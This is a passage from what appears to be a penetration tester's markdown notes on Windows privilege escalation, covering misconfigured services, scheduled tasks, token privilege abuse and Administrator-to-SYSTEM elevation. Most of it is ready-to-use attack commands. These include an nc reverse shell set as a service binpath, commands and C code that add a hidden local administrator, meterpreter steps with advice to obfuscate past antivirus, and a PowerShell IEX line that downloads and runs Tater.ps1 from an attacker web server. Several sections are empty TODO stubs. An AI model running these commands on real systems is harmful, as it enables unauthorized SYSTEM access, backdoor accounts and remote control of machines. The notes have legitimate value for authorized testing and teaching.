`NT AUTHORITY\LocalService` and grants the permission `SERVICE_ALL_ACCESS` to
all `Authenticated Users`, meaning all authenticated users on the system can
fully modify the service configuration. Du to the End-of-Life status of the
Service Pack affected, the vulnerability will not be fixed and can be used as
an universal privileges escalation method on Windows XP SP0 & SP1.  

```
# accesschk.exe -uwcqv "Authenticated Users" *
# RW upnphost SERVICE_ALL_ACCESS
# sc qc upnphost
# SERVICE_START_NAME : NT AUTHORITY\LocalService

sc config upnphost binpath= "C:\<NC.EXE> -e C:\WINDOWS\System32\cmd.exe <IP> <PORT>"
sc config upnphost binpath= "net user <USERNAME> <PASSWORD> /add && net localgroup Administrators <USERNAME> /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""

net stop upnphost
net start upnphost
```

###### Generate new service binary

*Add a local administrator user*

The following C code can be used to add a local administrator user:

```
#include <stdlib.h>

int main() {
  int i;
  i = system("net user <USERNAME> <PASSWORD> /add");
  i = system("net localgroup administrators <USERNAME> /add");
  return 0;
}
```

The C code above can be compiled on Linux using the  cross-compiler `mingw`
(refer to cross compilation above).

*Reverse shell*

The service can be leveraged to start a privileged reverse shell. Refer to the
`[General] Shells - Binary` note.  

####### Service restart

To restart the service:

```
# Stop
net stop <SERVICE_NAME>
Stop-Service -Name <SERVICE_NAME> -Force

# Start
net start <SERVICE_NAME>
Start-Service -Name <SERVICE_NAME>
```

If an error `System error 1068` ("The dependency service or group failed to
start."), the dependencies can be removed to fix the service:

```
sc config <SERVICE_NAME> depend= ""
```

### Scheduled tasks & statup commands

Scheduled tasks are used to automatically perform a routine task on the system
whenever the criteria associated to the scheduled task occurs. The scheduled
tasks can either be run at a defined time, on repeat at set intervals, or
when a specific event occurs, such as the system boot.

The scheduled tasks are exposed to the same kinds of misconfigurations flaws
affecting the Windows services. However, note that the Windows GUI utility `Task
Scheduler`, used to configure scheduled task, will always make use of quoted
binary path, thus limiting the occurrence of unquoted scheduled task path.

The Windows built-in `schtasks` can be used to enumerate the scheduled tasks
configured on the system or to retrieve information about a specific scheduled
task.

```
# List all configured scheduled tasks - verbose
schtasks /query /fo LIST /v
Get-ScheduledTask

# Query the specified scheduled task
schtasks /v /query /fo LIST  /tn <TASK_NAME>
Get-ScheduledTask -TaskName <TASK_NAME>

# Start up commands
Get-WMIObject Win32_StartupCommand -NameSpace "root\CIMV2"
```

The commands below can be chained to filter the enabled scheduled tasks name and
action for `NT AUTHORITY\SYSTEM`, `Administrator` or the specified user:   

```
# Windows
schtasks /query /fo LIST /v > <TASKS_LIST_FILE>

# Linux
grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 "NT AUTHORITY\\\SYSTEM\|Administrator"
grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 <USERNAME>
```

The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
the scheduled tasks binary:

```
icacls <BINARY_PATH>
```

If the current user can modify the binary / script of a scheduled task run by
another user, arbitrary command execution under the other user privileges can
be achieved once the criteria associated to the scheduled task occurs.

Refer to the `[General] Shells - Binary` note for reverse shell binaries /
scripts.  

### Token Privileges abuse

###### Vulnerable privileges

Use the following command to retrieve the current user account token privileges:

```
whoami /priv

whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege"
```

The following tokens can be exploited to gain SYSTEM access privileges:
- `SeImpersonatePrivilege`
- `SeAssignPrimaryPrivilege`
- `SeTcbPrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeCreateTokenPrivilege`
- `SeLoadDriverPrivilege`
- `SeTakeOwnershipPrivilege`
- `SeDebugPrivilege`

###### Juicy Potato

`Juicy Potato` is an improved version of `RottenPotatoNG` that allows for
privilege escalation to `NT AUTHORITY\SYSTEM` from any account having the
`SeImpersonate` or `SeAssignPrimaryToken` privileges.

`RottenPotatoNG`, and its variants, leverages a privilege escalation chain
based on the `BITS` service, while `Juicy Potato` can use the service
specified as parameter, using its `Class Identifier (CLSID)`.  

A list of services' `CLSID` that can be leveraged for privilege escalation is
available on the tool GitHub repository:
`https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md`

```
Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <BINARY>: program to launch
-l <PORT>: COM server listen port

JuicyPotato.exe -t * -c <CLSID> -l <PORT> -p <cmd.exe | powershell.exe | BINARY>
```

###### Rotten Potato x64 w/ Metasploit

`RottenPotato` can be used in combination with the `Metasploit` `meterpreter`
incognito module to abuse the privileges above in order to elevate privilege to
SYSTEM.

Source: https://github.com/breenmachine/RottenPotatoNG

```
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

###### LonelyPottato (RottenPotato w/o Metasploit)

###### Tater

`Tater` is a `PowerShell` implementation of the Hot Potato Windows Privilege
Escalation exploit.

```
# Import module (Import-Module or dot source method)
Import-Module ./Tater.ps1
. ./Tater.ps1

# Trigger (Default = 1): Trigger type to use in order to trigger HTTP to SMB relay.
0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task

Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add"

# Memory injection and run
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
```

###### TODO

https://2018.romhack.io/slides/RomHack%202018%20-%20Andrea%20Pierini%20-%20whoami%20priv%20-%20show%20me%20your%20Windows%20privileges%20and%20I%20will%20lead%20you%20to%20SYSTEM.pdf

--------------------------------------------------------------------------------
### Windows Subsystem for Linux (WSL) - TODO

Windows Subsystem for Linux
Introduced in Windows 10
Lets you execute Linux binaries natively on Windows

######
###### File system

###### Backdoor

*bashrc*

*Planified tasks*

### Credentials re-use

Refer to the `Active Directory - Credentials theft shuffle` for methodology and
tools to re use compromised credentials on the target.

### Administrator to SYSTEM

The NT AUTHORITY\ SYSTEM account and the administrator account (Administrators
group) have the same file privileges, but they have different functions.  
The system account is used by the operating system and by services that run
under Windows. It is an internal account, does not show up in User Manager,
cannot be added to any groups, and cannot have user rights assigned to it.  
The system account is needed by tools that make us of Debug Privilege
(such as `mimikatz`) which allows someone to debug a process that they wouldn’t
otherwise have access to.

The `PsExec` Microsoft signed tool can be used to elevate to system privilege
from an administrator account:

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec.exe -accepteula -s -i -d cmd.exe
```

If a `meterpreter` shell is being used, the `getsystem` command can be
leveraged to the same end.

### TODO

### Process and installed programs

The following commands can be used to retrieve the process, services,
installed programs and scheduled tasks of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |